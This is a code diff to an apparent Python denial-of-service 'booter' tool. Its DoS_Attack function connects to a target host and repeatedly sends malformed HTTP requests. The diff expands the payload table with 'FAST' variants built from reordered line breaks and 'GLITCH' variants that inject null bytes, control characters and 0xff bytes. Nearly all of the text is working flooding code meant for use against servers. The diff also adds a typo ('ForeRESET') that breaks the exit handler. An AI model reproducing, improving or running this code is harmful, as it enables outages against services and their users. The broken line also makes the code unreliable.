@@ -37,12 +37,22 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
-            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
-            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
+            'BASIC': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
+            'FAST1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
+            'FAST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
+            'FAST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
+            'FAST4': f"{type_attack} /{url_path} HTTP/1.1\r\n\r\nHost: {host}\r\n",
+            'FAST5': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\n\n\n",
+            'FAST6': f"{type_attack} /{url_path} HTTP/1.1\n\n\nHost: {host}",
+            'FAST7': f"{type_attack} /{url_path} HTTP/1.1\r\n\r\n\r\nHost: {host}",
+            'FAST8': f"{type_attack} /{url_path} HTTP/1.1\rHost: {host}\n\n",
+            'GLITCH1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\x00\n\n",
+            'GLITCH2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\x00\x00\n\n",
+            'GLITCH3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\a\n\n",
+            'GLITCH4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\xff\xff",
+            'GLITCH5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\b\t\n\n",
         }
-        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
+        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['BASIC']).encode()
         s.connect((ip, port))
         for _ in range(booter_sent):
             if stop_attack.is_set():
@@ -145,7 +155,7 @@ def command():
             else:
                 print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
         except KeyboardInterrupt:
-            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
+            print(f"\n{Fore.RED}Program terminated by user. Exiting...{ForeRESET}")
             stop_attack.set()
             sys.exit(0)
 
